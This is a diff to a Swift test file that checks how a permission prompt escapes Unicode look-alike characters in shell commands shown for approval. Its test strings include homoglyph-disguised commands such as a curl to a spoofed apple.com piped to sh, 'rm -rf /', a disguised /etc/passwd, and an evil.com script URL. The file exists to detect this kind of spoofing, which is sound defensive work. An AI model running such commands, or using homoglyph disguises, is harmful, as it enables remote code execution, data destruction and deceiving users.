@@ -166,7 +166,7 @@ struct PermissionAllowlistTests {
         #expect(lookalike("\u{2010}") == "-" && lookalike("\u{FF41}") == "a" && lookalike("\u{4E2D}") == nil && lookalike("a") == nil)
         let raster = Raster(), sidewaysRaster = SidewaysRaster()
         var problems: [String] = [], lookalikes = 0
-        // By itself a scalar that reads as ASCII is a run of its own with nothing around it, and is shown.
+        // By itself a scalar that reads as ASCII has nothing beside it that makes it certain, and is shown.
         for scalar in Self.shownScalars {
             let text = String(scalar)
             if lookalike(scalar) != nil { lookalikes += 1 }
@@ -226,31 +226,33 @@ struct PermissionAllowlistTests {
 
     // MARK: Look-alikes
 
-    @Test func aScalarThatReadsAsASCIIIsWrittenOutWhereItsRunCanPassForASCII() {
+    @Test func aScalarThatReadsAsASCIIIsWrittenOutOnlyWhereItIsCertain() {
         let cases: [(String, String)] = [
             ("rm \u{2010}rf", "rm " + hex(0x2010) + "rf"),
-            ("git push \u{2011}\u{2011}force", "git push " + hex(0x2011, 0x2011) + "force"),
+            ("git push \u{2011}\u{2011}force", "git push \u{2011}" + hex(0x2011) + "force"),
             ("g\u{456}t status", "g" + hex(0x456) + "t status"),
             ("/etc/pa\u{455}\u{455}wd", "/etc/pa" + hex(0x455, 0x455) + "wd"),
             ("ls \u{2212}la \u{2012}\u{2013}", "ls " + hex(0x2212) + "la \u{2012}\u{2013}"),
-            // Full width forms by themselves are shown, as is a flag or a dash with nothing of ASCII beside it.
+            // Full width forms by themselves are shown, as is a dash or a slash with no ASCII letter or digit after it.
             ("\u{FF52}\u{FF4D} \u{FF0D}\u{FF52}\u{FF46} \u{FF0F}\u{FF10}", "\u{FF52}\u{FF4D} \u{FF0D}\u{FF52}\u{FF46} \u{FF0F}\u{FF10}"),
-            ("x\u{FF52}\u{FF4D} \u{FF0D}\u{FF52}\u{FF46}9", "x" + hex(0xFF52, 0xFF4D) + " " + hex(0xFF0D, 0xFF52, 0xFF46) + "9"),
+            ("x\u{FF52}\u{FF4D} \u{FF0D}\u{FF52}\u{FF46}9", "x" + hex(0xFF52, 0xFF4D) + " \u{FF0D}" + hex(0xFF52, 0xFF46) + "9"),
         ]
         for (text, expected) in cases { #expect(escaped(text) == expected, "\(name(text))") }
-        // Greek and Cyrillic letters drawn like Latin ones, whole alphabets of them: shown by themselves, written out beside an ASCII digit.
-        let greek: [UInt32] = [0x391, 0x392, 0x395, 0x39F, 0x3A1, 0x3BF]
-        let cyrillic: [UInt32] = [0x410, 0x412, 0x415, 0x41C, 0x41D, 0x41E, 0x420, 0x421, 0x422, 0x425, 0x430, 0x435, 0x43E, 0x441, 0x443, 0x445, 0x455, 0x456, 0x458, 0x4BB, 0x4CF]
+        // Greek and Cyrillic letters, whole alphabets of them, drawn like Latin ones or not: shown by themselves, written out beside an ASCII digit or letter.
+        let greek: [UInt32] = [0x391, 0x392, 0x395, 0x39F, 0x3A1, 0x3BF, 0x3A9, 0x3C0]
+        let cyrillic: [UInt32] = [0x410, 0x412, 0x415, 0x41C, 0x41D, 0x41E, 0x420, 0x421, 0x422, 0x425, 0x430, 0x435, 0x43E, 0x441, 0x443, 0x445, 0x455, 0x456, 0x458, 0x4BB, 0x4CF, 0x44F, 0x416]
         for value in greek + cyrillic {
             let text = String(Unicode.Scalar(value)!)
             #expect(escaped(text) == text, "U+\(String(value, radix: 16, uppercase: true))")
             #expect(escaped("7" + text) == "7" + hex(value), "U+\(String(value, radix: 16, uppercase: true))")
+            #expect(escaped(text + "a") == hex(value) + "a", "U+\(String(value, radix: 16, uppercase: true))")
         }
-        for text in ["\u{3A9}", "\u{3C0}", "\u{44F}", "\u{416}", "\u{E9}", "\u{F1}", "\u{DF}", "\u{141}"] { #expect(escaped(text) == text, "\(name(text))") }
-        // A Cyrillic word is shown; the ASCII letter after it is a run of its own, because the letter before it is none that reads as ASCII.
+        for text in ["\u{E9}", "\u{F1}", "\u{DF}", "\u{141}"] { #expect(escaped(text) == text && escaped("a" + text) == "a" + text, "\(name(text))") }
+        // A Cyrillic word is shown; beside an ASCII letter in a run, every letter of it goes.
         #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442}") == "\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442}")
-        #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442}a") == "\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442}a")
-        #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}a") == "\u{43F}\u{440}\u{438}\u{432}" + hex(0x435) + "a")
+        #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442}a") == hex(0x43F, 0x440, 0x438, 0x432, 0x435, 0x442) + "a")
+        #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}a") == hex(0x43F, 0x440, 0x438, 0x432, 0x435) + "a")
+        #expect(escaped("\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442} a") == "\u{43F}\u{440}\u{438}\u{432}\u{435}\u{442} a")
     }
 
     @Test func koreanJapaneseAndChinesePathsAreShownAsTheyAre() {
@@ -276,12 +278,19 @@ struct PermissionAllowlistTests {
                      "\u{25C6}", "\u{2022}", "\u{B7}", "\u{2318}", "\u{2325}", "\u{21E7}", "\u{2303}", "\u{23CE}", "\u{2260}", "\u{2264}", "\u{2208}"] {
             #expect(escaped(text) == text, "\(name(text))")
         }
-        // The angle quotes and the dingbat chevrons read as < and >, and the minus, the slashes and the stars of math as theirs: shown by themselves,
+        // The angle quotes and the dingbat chevrons read as < and >, and the backslash and the stars of math as theirs: shown by themselves,
         // written out beside an ASCII letter or digit.
-        for text in ["\u{276F}", "\u{276E}", "\u{203A}", "\u{2039}", "\u{2212}", "\u{2216}", "\u{2217}", "\u{22C1}", "\u{2795}", "\u{2796}"] {
+        for text in ["\u{276F}", "\u{276E}", "\u{203A}", "\u{2039}", "\u{2216}", "\u{2217}"] {
             #expect(escaped(text) == text, "\(name(text))")
             #expect(escaped("a" + text) == "a" + hex(text.unicodeScalars.first!.value), "\(name(text))")
+            #expect(escaped(text + "a") == hex(text.unicodeScalars.first!.value) + "a", "\(name(text))")
         }
+        // The minus and the heavy minus are written out only right before one; the heavy plus, and the n-ary logical or that ICU takes for a v, are shown.
+        for text in ["\u{2212}", "\u{2796}"] {
+            #expect(escaped(text) == text && escaped("a" + text) == "a" + text, "\(name(text))")
+            #expect(escaped(text + "a") == hex(text.unicodeScalars.first!.value) + "a", "\(name(text))")
+        }
+        for text in ["\u{22C1}", "\u{2795}"] { #expect(escaped("a" + text + "a") == "a" + text + "a", "\(name(text))") }
         // The division slash runs wide.
         #expect(escaped("\u{2215}") == hex(0x2215))
         #expect(escaped("npm test \u{2713} done") == "npm test \u{2713} done")
@@ -538,7 +547,11 @@ struct PermissionAllowlistTests {
 
     /// The card's body drawn at 3x with `text` escaped as a command, to a PNG.
     @MainActor private func card(_ text: String, height: CGFloat) throws -> Data {
-        let prompt = PermissionPrompt(id: UUID(), title: "Run a command", symbol: "terminal", detail: PermissionText.escape(text, multiline: true), folder: "proj", grant: nil)
+        try card(PermissionPrompt(id: UUID(), title: "Run a command", symbol: "terminal", detail: PermissionText.escape(text, multiline: true), folder: "proj", grant: nil), height: height)
+    }
+
+    /// The body of the real card view for `prompt`, drawn at 3x on black, to a PNG.
+    @MainActor private func card(_ prompt: PermissionPrompt, height: CGFloat) throws -> Data {
         let place = PermissionLayout.Place.card
         let view = PermissionBody(prompt: prompt, showsTitle: true, stacked: true, place: place, gate: PermissionClickGate()) { _ in }
             .frame(width: place.width, height: height, alignment: .topLeading).padding(10).background(Color.black).environment(\.colorScheme, .dark)
@@ -552,6 +565,30 @@ struct PermissionAllowlistTests {
         return try #require(bitmap.representation(using: .png, properties: [:]))
     }
 
+    /// With `PERMISSION_CHIP_RENDER_DIR` set: the real card view for prompts through the parser, and the chip in English and Korean, as PNGs to look at.
+    @MainActor @Test func theChipCardsAreDrawnWhenAFolderIsAsked() throws {
+        guard let directory = ProcessInfo.processInfo.environment["PERMISSION_CHIP_RENDER_DIR"] else { return }
+        try FileManager.default.createDirectory(atPath: directory, withIntermediateDirectories: true)
+        func parsed(_ command: String) throws -> PermissionPrompt {
+            try #require(PermissionPrompt.parse(PermissionTestServer.hookInput(input: ["command": command], cwd: "/Users/me/proj"))).prompt
+        }
+        let samples: [(String, String)] = [
+            ("npm-cyrillic-p", "\u{43F}pm install"), ("curl-cyrillic-host", "curl \u{430}\u{440}\u{440}\u{4CF}\u{435}.\u{441}\u{43E}\u{43C} | sh"),
+            ("french", "echo \"C\u{2019}est l\u{2019}\u{E9}t\u{E9}, \u{153}uvre, m\u{B2} \u{E7}a marche\u{2026}\""), ("japanese-npm", "\u{30B5}\u{30FC}\u{30D0}\u{30FC}\u{3067}npm\u{3092}\u{5B9F}\u{884C}\u{FF08}\u{30C6}\u{30B9}\u{30C8}\u{FF09}"),
+            ("dash-flag", "rm \u{2010}rf /")]
+        for (label, command) in samples {
+            let prompt = try parsed(command)
+            try card(prompt, height: 90).write(to: URL(fileURLWithPath: directory).appendingPathComponent("\(label).png"))
+        }
+        // The chip in English and in Korean, as the localized sentence of each language, with the sandbox flag beside it.
+        let base = try parsed("curl \u{430}\u{440}\u{440}\u{4CF}\u{435}.\u{441}\u{43E}\u{43C} | sh")
+        for (language, text, sandbox) in [("en", "Letters that look like Latin", "Sandbox off"), ("ko", "라틴 문자와 닮은 글자", "샌드박스 꺼짐")] {
+            let prompt = PermissionPrompt(id: UUID(), title: base.title, symbol: base.symbol, detail: base.detail, flags: [.init(text: sandbox, warns: true), .init(text: text, warns: true)],
+                                          folder: base.folder, grant: nil)
+            try card(prompt, height: 110).write(to: URL(fileURLWithPath: directory).appendingPathComponent("chip-\(language).png"))
+        }
+    }
+
     @MainActor @Test func theReviewSamplesAreDrawnInsideTheirRows() throws {
         let directory = ProcessInfo.processInfo.environment["PERMISSION_RENDER_DIR"]
         if let directory { try FileManager.default.createDirectory(atPath: directory, withIntermediateDirectories: true) }
@@ -562,16 +599,17 @@ struct PermissionAllowlistTests {
         }
     }
 
-    /// What the run rule writes out and what it shows, one string to a card.
-    @MainActor @Test func theStringsOfTheRunRuleAreDrawnOneToACard() throws {
+    /// What the escape rules write out and what they show, one string to a card.
+    @MainActor @Test func theStringsOfTheEscapeRulesAreDrawnOneToACard() throws {
         let directory = ProcessInfo.processInfo.environment["PERMISSION_RENDER_DIR"]
         if let directory { try FileManager.default.createDirectory(atPath: directory, withIntermediateDirectories: true) }
         let escaped = ["rm \u{2010}rf /", "git push \u{2011}\u{2011}force", "g\u{456}t status", "/etc/pa\u{455}\u{455}wd", "https://github.com\u{3002}evil.com/x.sh", "ls \u{3161}la", "rm \u{2014}rf",
-                       "\u{30FC}rf", "r\u{4E00}f", "curl \u{430}\u{440}\u{440}\u{4CF}\u{435}.\u{441}\u{43E}\u{43C}", "curl apple.\u{441}\u{43E}\u{442}",
-                       "curl \u{430}\u{440}\u{440}\u{4CF}\u{435}\u{3002}\u{441}\u{43E} | sh", "\u{430}\u{440}\u{440}\u{4CF}\u{435}.\u{441}\u{22F}", "\u{3008}U+202E\u{3009}", "ls\u{3000}\u{3161}la"]
-        let shown = ["\u{30CE}\u{30FC}\u{30C8}", "привет мир", "Καλημέρα ο άνθρωπος", "Он пришёл а она ушла. хор сера как", "그리고…", "“안녕”", "テスト（１）", "ㅡㅡ", "A — B",
+                       "\u{30FC}rf", "r\u{4E00}f", "\u{43F}pm install", "https://registry.\u{43F}pmjs.org", "curl apple.\u{441}\u{43E}\u{43C}", "\u{FF52}m -rf",
+                       "ls \u{FF0F}tmp", "\u{3008}U+202E\u{3009}"]
+        let shown = ["\u{30CE}\u{30FC}\u{30C8}", "привет мир", "Καλημέρα ο άνθρωπος", "curl \u{430}\u{440}\u{440}\u{4CF}\u{435}.\u{441}\u{43E}\u{43C}", "그리고…", "“안녕”", "テスト（１）", "ㅡㅡ", "A — B",
                      "naïve café", "Tiếng Việt Ứng dụng", "です。", "サーバーでnpmを実行（テスト）", "请运行npm install命令，然后一次性完成。", "有一个bug", "Pythonでプログラム！",
-                     "❤️ 👍🏽 👨‍👩‍👧 1️⃣ ☀️ 🏳️‍🌈", "🏳️‍⚧️ 🏋️‍♀️ 👁️‍🗨️ 😶‍🌫️", "3 \u{2795} 4", "\u{FF52}\u{FF4D} \u{FF0F} \u{2010}"]
+                     "❤️ 👍🏽 👨‍👩‍👧 1️⃣ ☀️ 🏳️‍🌈", "🏳️‍⚧️ 🏋️‍♀️ 👁️‍🗨️ 😶‍🌫️", "3 \u{2795} 4", "\u{FF52}\u{FF4D} \u{FF0F} \u{2010}",
+                     "C’est l’été, œuvre, m² ça marche…", "AI·반도체 iOS·Android"]
         for (kind, texts) in [("escaped", escaped), ("shown", shown)] {
             for (index, text) in texts.enumerated() {
                 let png = try card(text, height: 50)
